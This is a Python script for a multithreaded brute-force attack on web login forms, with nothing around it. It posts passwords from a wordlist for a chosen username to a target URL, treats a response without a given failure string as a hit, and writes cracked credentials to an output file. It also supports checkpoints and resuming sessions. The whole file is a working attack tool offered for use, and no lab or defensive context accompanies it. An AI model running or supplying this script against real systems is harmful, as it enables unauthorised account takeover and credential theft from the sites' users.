import requests
import threading
import time
import argparse
import sys
import json
import os
from queue import Queue
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from datetime import datetime

session = requests.Session()
retries = Retry(total=3, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
session.mount('http://', HTTPAdapter(max_retries=retries))

attempt_counter = 0
attempt_counter_lock = threading.Lock()
should_exit = threading.Event()

def get_meta_file(wordlist):
    base = os.path.basename(wordlist) if wordlist else "default"
    return f".session.{base}.meta"

def find_latest_meta_file():
    files = [f for f in os.listdir('.') if f.startswith('.session.') and f.endswith('.meta')]
    return max(files, key=os.path.getmtime) if files else None

def list_all_meta_files():
    return sorted(
        [f for f in os.listdir('.') if f.startswith('.session.') and f.endswith('.meta')],
        key=os.path.getmtime,
        reverse=True
    )

def print_startup_info(args, total_passwords, resume_line):
    print("\n====== Brute-Force Session Started ======")
    print(f"[📡] Target URL     : {args.url}")
    print(f"[👤] Username       : {args.username}")
    print(f"[📂] Wordlist File  : {args.wordlist}")
    print(f"[🔢] Password Count : {total_passwords}")
    print(f"[📍] Start From Line: {resume_line + 1}")
    print(f"[🔁] Threads        : {args.threads}")
    print(f"[🧩] Fail Keyword   : \"{args.fail_string}\"")
    print(f"[📄] Output File    : {args.output if args.output else 'None'}")
    print(f"[📝] Checkpoint     : {args.checkpoint if args.checkpoint else 'None'}")
    print(f"[🔄] Resume Mode    : {'Yes' if args.resume else 'No'}")
    print(f"[🔍] Verbose Mode   : {'Enabled' if args.verbose else 'Disabled'}")
    print(f"[🕒] Start Time     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=========================================\n")

def load_checkpoint_line(checkpoint_file):
    try:
        with open(checkpoint_file, "r") as f:
            return int(f.read().strip())
    except:
        return 0

def save_checkpoint_line(checkpoint_file, line_number):
    if checkpoint_file:
        with open(checkpoint_file, "w") as f:
            f.write(str(line_number))

def save_success(output_file, username, password):
    if output_file:
        with open(output_file, "a") as f:
            f.write(f"[SUCCESS] {username} : {password}\\n")

def clear_queue(q):
    while not q.empty():
        try:
            q.get_nowait()
            q.task_done()
        except:
            break

def save_meta(args):
    meta = {
        "url": args.url,
        "username": args.username,
        "wordlist": args.wordlist,
        "fail_string": args.fail_string,
        "threads": args.threads,
        "checkpoint": args.checkpoint,
        "output": args.output,
        "verbose": args.verbose
    }
    meta_file = get_meta_file(args.wordlist)
    with open(meta_file, "w") as f:
        json.dump(meta, f)

def load_meta_file(path):
    with open(path, "r") as f:
        return json.load(f)

def worker(url, username, password_queue, found, verbose, fail_string, output_file, checkpoint_file, line_tracker):
    global attempt_counter
    while not password_queue.empty():
        if should_exit.is_set():
            password_queue.task_done()
            break
        line_number, password = password_queue.get()
        try:
            data = {"username": username, "password": password}
            response = session.post(url, data=data, timeout=10)
            time.sleep(0.1)
            with attempt_counter_lock:
                attempt_counter += 1
                line_tracker['last'] = line_number
            if fail_string not in response.text:
                print(f"[✅] Success! Username: {username} | Password: {password}")
                save_success(output_file, username, password)
                found.set()
                should_exit.set()
                clear_queue(password_queue)
                break
            elif verbose:
                print(f"[-] Failed: {password}")
        except requests.RequestException as e:
            if verbose:
                print(f"[!] Error with {password}: {e}")
        finally:
            password_queue.task_done()

def progress_monitor(password_queue, found):
    global attempt_counter
    while not found.is_set() and not password_queue.empty() and not should_exit.is_set():
        time.sleep(120)
        with attempt_counter_lock:
            print(f"[⏳] {attempt_counter} attempts tried, {password_queue.qsize()} remaining...")

def main():
    parser = argparse.ArgumentParser(description="Threaded brute-forcer with resume, checkpoint, and meta cleanup")
    parser.add_argument('--url', help='Target login URL')
    parser.add_argument('--username', help='Username to brute-force')
    parser.add_argument('--wordlist', help='Path to password wordlist')
    parser.add_argument('--fail-string', help='String in response that indicates login failure')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--checkpoint', help='Checkpoint file to track line number')
    parser.add_argument('--output', help='Output file for successful credentials')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--resume', action='store_true', help='Resume from given checkpoint')
    parser.add_argument('-R', '--resume-last', action='store_true', help='Resume from most recent session meta')
    parser.add_argument('--clean-meta', action='store_true', help='Delete all .session.*.meta files')

    global args
    args = parser.parse_args()

    if args.clean_meta:
        for f in list_all_meta_files():
            os.remove(f)
            print(f"[🗑️] Deleted {f}")
        return

    # Resume from latest .meta file
    if args.resume_last:
        meta_path = find_latest_meta_file()
        if not meta_path:
            print("[!] No previous session metadata found.")
            sys.exit(1)
        meta = load_meta_file(meta_path)
        print(f"[ℹ] Resuming last session from: {meta_path}")
        args.url = meta['url']
        args.username = meta['username']
        args.wordlist = meta['wordlist']
        args.fail_string = meta['fail_string']
        args.threads = meta['threads']
        args.checkpoint = meta['checkpoint']
        args.output = meta['output']
        args.verbose = meta['verbose']
        args.resume = True

    if args.resume and not args.checkpoint:
        print("[!] --resume requires --checkpoint.")
        sys.exit(1)

    # Validate required args
    if not all([args.url, args.username, args.wordlist, args.fail_string]):
        print("[!] Missing required arguments.")
        sys.exit(1)

    resume_line = load_checkpoint_line(args.checkpoint) if args.resume else 0

    password_queue = Queue()
    found = threading.Event()
    line_tracker = {'last': resume_line}

    total_passwords = 0
    try:
        with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
            for i, line in enumerate(f):
                password = line.strip()
                if i >= resume_line and password:
                    password_queue.put((i + 1, password))
                    total_passwords += 1
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {args.wordlist}")
        return

    print_startup_info(args, total_passwords, resume_line)
    save_meta(args)

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(
            args.url, args.username, password_queue, found, args.verbose, args.fail_string,
            args.output, args.checkpoint, line_tracker
        ))
        t.daemon = True
        t.start()
        threads.append(t)

    if not args.verbose:
        monitor = threading.Thread(target=progress_monitor, args=(password_queue, found))
        monitor.daemon = True
        monitor.start()

    try:
        while any(t.is_alive() for t in threads):
            time.sleep(0.2)
            if should_exit.is_set():
                break
        password_queue.join()
    except KeyboardInterrupt:
        print("\\n[⛔] Brute-force cancelled by user (Ctrl+C)")
        should_exit.set()
        clear_queue(password_queue)

    if not found.is_set() and not should_exit.is_set() and password_queue.empty():
        print("[-] Password not found in the wordlist.")

    if found.is_set():
        print("[✔] Brute-force complete — password found.")

    if args.checkpoint:
        save_checkpoint_line(args.checkpoint, line_tracker['last'])

    # Show other meta files if any
    if not args.resume_last and not args.clean_meta:
        other_meta = [f for f in list_all_meta_files() if get_meta_file(args.wordlist) != f]
        if other_meta:
            print(f"[!] You have {len(other_meta)} other session files not resumed:")
            for f in other_meta:
                print(f"    - {f} (last used {datetime.fromtimestamp(os.path.getmtime(f))})")

if __name__ == "__main__":
    main()
